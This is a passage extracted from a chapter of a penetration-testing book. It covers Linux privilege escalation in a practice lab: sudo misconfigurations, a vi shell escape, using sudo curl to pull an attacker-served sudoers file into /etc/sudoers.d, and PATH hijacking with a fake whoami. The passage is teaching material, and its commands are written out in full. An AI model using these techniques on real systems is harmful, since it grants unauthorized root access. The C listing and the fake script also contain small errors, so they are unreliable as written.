# Security Chapter Extract
Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
Chapter: 09 - To take this exploitation further and practice your bash scripting, improve the script so it can iterate through all available key identities and brute-force them one by one.
Security Relevance Score: 9
Word Count: 2072
Extracted: 2025-06-13 23:40:57

---

To take this exploitation further and practice your bash scripting, improve the script so it can iterate through all available key identities and brute-force them one by one.




Examining the sudo Configuration
The sudo Linux command elevates a user’s permissions to root without granting that user direct access to the root account. Imagine that you’re the administrator of a server and want to give another user the ability to add new firewall rules. While you could just hand them the root account password, doing so could lead to a compromise. With sudo, you could grant permissions to run, say, the iptables command or a tool like tcpdump without revealing the root account’s password.
From an attacker’s perspective, the sudo configuration is worth exploring, as a misconfiguration could grant you access to sensitive resources. On your Kali machine, the built-in kali user has sudo access by default. You can test it by running the following command:
$ sudo -l
The command should then prompt you to enter your login password:
[sudo] password for kali:
Matching Defaults entries for kali on kali:
    env_reset, mail_badpass,
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User kali may run the following commands on kali:
    (ALL : ALL) ALL

The -l flag lists the current user’s sudo privileges. As you can see, the user has (ALL : ALL) ALL, which basically means unlimited privileged access.
The sudo command can grant granular permissions thanks to its configuration file /etc/sudoers. Here are a few permission grants you could achieve with advanced sudo configurations:

Granting sudo permissions to a particular user or group
Granting sudo permissions to a particular user or group for a particular system command only
Granting sudo permissions to a particular user or group for a particular script only
Granting sudo permission to run a command without requiring the user to enter their password

To supplement /etc/sudoers, the /etc/sudoers.d directory can store independent sudo configuration files. The main /etc/sudoers file can import files from this directory by using the @includedir instruction:
$ sudo cat /etc/sudoers

--snip--
@includedir /etc/sudoers.d

Keep in mind that /etc/sudoers can be modified only by privileged users and is readable only by the root user and root group:
$ ls -ld /etc/sudoers

-r--r----- 1 root root 1714 Feb 18 07:03 /etc/sudoers

If you’re able to write to this file or into the directory /etc/sudoers.d, you should be able to grant yourself root access; by default, however, you aren’t able to do this.
In Kali, any member of the kali-trusted group is granted sudo access without requiring a password, as defined in the /etc/sudoers.d/kali-grant-root file:
$ sudo cat /etc/sudoers.d/kali-grant-root

# Allow members of group kali-trusted to execute any command without a
# password prompt.

%kali-trusted   ALL=(ALL:ALL) NOPASSWD: ALL

Since the kali user is not part of the kali-trusted group, this user has sudo privileges but is required to supply a password whenever it’s used.
However, the kali user is part of the sudo group, referenced in /etc/sudoers. Users who are members of this group are automatically granted unlimited sudo access, as defined by this configuration line:
$ sudo cat /etc/sudoers
# Allow members of group sudo to execute any command.

%sudo    ALL=(ALL:ALL) ALL

To see the list of groups the kali user is a member of, run the groups command:
$ groups

kali adm dialout cdrom floppy sudo audio dip video plugdev users
netdev bluetooth scanner wireshark kaboxer vboxsf docker

Here are a few examples of sudo configurations that could lead to privilege escalation scenarios:

The system could grant you sudo permissions on dangerous commands, including shell commands that could land you in a root shell.
The system could configure sudo on a script that is writable by all users on a system, allowing unauthorized users to add malicious commands that would get executed with the root context.
Groups containing a large number of users could be granted sudo, expanding the attack surface and adding more ways to gain sudo access (as you could attempt to exploit each of the sudo group members).

The next section should help you understand the dangers of granting sudo access.

Abusing Text Editor Tricks
Let’s walk through an attack that relies on sudo access. As the backup user on p-jumpbox-01 (176.16.10.13), run the sudo -l command and provide the password (backup) when prompted. Then view the sudo configuration for this user:
$ sudo -l

User backup may run the following commands on p-jumpbox-01:
    (ALL : ALL) /usr/bin/vi
    (ALL : ALL) /usr/bin/curl

It looks like we’ve been granted sudo access on vi, a text editor. Granting sudo permissions on a text editor may seem innocent, but it’s not.
For instance, we could pass a file to the vi command to tell it to write to that file. When granted sudo access, we can write to any file we’d like or create new files in system locations that are accessible or writable to the root user only.
Let’s write a file to a system location that regular users aren’t allowed to access under normal circumstances. Enter the following:
$ sudo vi /etc/demo.txt
A text editor prompt should appear. Press the I key on the keyboard, then enter anything you like. When done, press ESC, followed by SHIFT-:. Enter wq! and press ENTER to save the file and quit. You’ll notice that we are able to write the file to the /etc directory, which is writable by privileged users only. Similarly, we could edit any file on the system, such as /etc/passwd and /etc/shadow, or even insert a backdoor to an application directly.
To take advantage of this access, try dropping yourself into a root shell. vi allows the execution of bash commands from within the text editor’s window. This feature is convenient when you’re programming and need to execute shell commands to see the output or to view files outside the script.
Enter sudo vi in the terminal, then press SHIFT-: and enter !bash. You should now be in a root shell! Enter the whoami command to confirm you’re the root user. At this point, you should set the root account’s password by using the passwd command (without any additional parameters) so that you can easily log in to it at any point.


Downloading Malicious sudoers Files
In the previous section, you may have noticed that we also have sudo access to curl, used to read resources from web servers. You may be asking yourself, What could we possibly do with sudo access to a command line–based HTTP client? Well, quite a bit!
If you look at the curl manual page, you’ll see it provides an -o (output) flag for writing content into files or directories. This means you can download files with curl by making a GET request to a website and redirect the output to a file by using the -o flag.
To exploit this behavior, we could set up a remote web server that serves a configuration file; if we can download this file in a way that overwrites an existing file, we could elevate our permissions or gain new access. Let’s exploit p-jumpbox-01 (176.16.10.13) once again to elevate from the backup user to the root user. Here are a few directions we could take:

Serving modified versions of /etc/passwd and /etc/shadow files that would change the password of the root user
Serving a modified version of /etc/sudoers so it grants sudo permissions to the backup user
Inserting a new sudo configuration into the /etc/sudoers.d directory
Serving a cron-job shell script that runs in the context of the system (as root) and is tasked with taking privileged actions on our behalf

We’ll take the third option: serving a custom sudoers file from the Kali machine and inserting it into the target’s /etc/sudoers.d directory.
First, grab the new sudo configuration file, add-sudo-to-user, from the book’s GitHub repository and place it somewhere on your filesystem, such as the Kali home directory. Next, open a terminal and navigate to the directory where the downloaded file is located. Then run the following command to start a web server on port 8080:
$ python3 -m http.server 8080
Next, as the p-jumpbox-01 backup user, run the following command to download the file from Kali. Kali’s lab IP address should be 172.16.10.1:
$ sudo curl -s http://172.16.10.1:8080/add-sudo-to-user -o /etc/sudoers.d/add-sudo-to-user
This curl command uses the -s flag (silent) to suppress output such as the download progress bar. We then make a GET request to the Kali machine to grab add-sudo-to-user. The -o (output) flag points to a filesystem destination where the output of the GET request will be saved. In this case, we use the /etc/sudoers.d directory. Confirm that the file was successfully pulled by using ls to list the files in /etc/sudoers.d. Then run the sudo -l command to see that you now have full sudo access.
Keep in mind that manually modifying the sudoers file is quite dangerous. Any errors you make could impact your ability to regain sudo access in the future, so we highly recommend using a dedicated sudo modification tool like visudo to modify sudo configurations. This tool catches syntax errors early so you don’t get locked out.
After successfully compromising the root account, we recommend setting the account’s password to passwd so you can easily switch to the account later.



Hijacking Executables via PATH Misconfigurations
The PATH environment variable is a colon-separated list of directories in which the shell searches for executables by default. For example, when you enter the touch command to create a file, the shell searches the PATH to locate the binary.
Run the following command on any compromised machine to see its current PATH value:
$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

To attempt privilege escalation, we could modify the PATH variable to include additional paths. For example, say a system has a dedicated custom script directory at /data/scripts. Modifying the PATH directory to include this script directory is quite easy:
$ PATH=$PATH:/data/scripts
$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/data/scripts

We can append paths to PATH, as in the previous example, but also prepend them. In the following example, we prepend the current working directory (.) to the path:
$ PATH=.:$PATH
Now, if an executable runs as root and calls an external command as part of its logic, it might execute the attacker-controlled file instead of the intended executable.
As an example, let’s use PATH hijacking to run a custom executable. We’ll target the following program written in C, which calls the whoami command. Let’s see if we can make it run a different binary of our choosing:
#include <stdio.h>
#include <stdlib.h>

int main(void)
    // This has the potential to get hijacked.
  ❶ system("whoami");

    // This should not be possible to hijack.
  ❷ system("/usr/bin/whoami");
    return 0;
}

At ❶, the code uses the command system("whoami") to call the whoami command, and at ❷, it calls the whoami binary directly by using its absolute path, /usr/bin/whoami.
Copy this code into a new file named getuser.c on any of the compromised machines. You can also download the file directly from the book’s GitHub repository. Next, compile this program and make it executable by using the GNU Compiler Collection (GCC):
$ gcc getuser.c -o getuser
This should create a new binary named getuser. Let’s set the executable permissions on it:
$ chmod u+x getuser
Now, set the PATH such that the current directory is prepended to it:
$ PATH="$(pwd):$PATH"
$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

In this output, you can see that the /tmp directory was prepended to the PATH. This is because we were in the /tmp directory when we executed this command; your value might look different if you navigated to a different directory. Make sure that the getuser binary is located in whatever directory you prepended to the PATH.
Since we control one of the directories in the PATH, we can create a fake whoami script in that path (Listing 9-2).
$ echo "#!/bin/bash" >> whoami
$ echo "I am not the whoami you were looking for!" >> whoami
$ chmod u+x whoami

Listing 9-2: Forging a whoami executable
The getuser program will look for the whoami command in the PATH, and since /tmp will be read first, it should pick up the fake program. Run getuser to see the result:
$ ./getuser

I am not the whoami you were looking for!
root

As you can see, the program executed the fake whoami script. Note, however, that the program’s second call to whoami executed the correct command because it specified the file’s full path.
Exercise 17: Maliciously Modifying a Cron Job
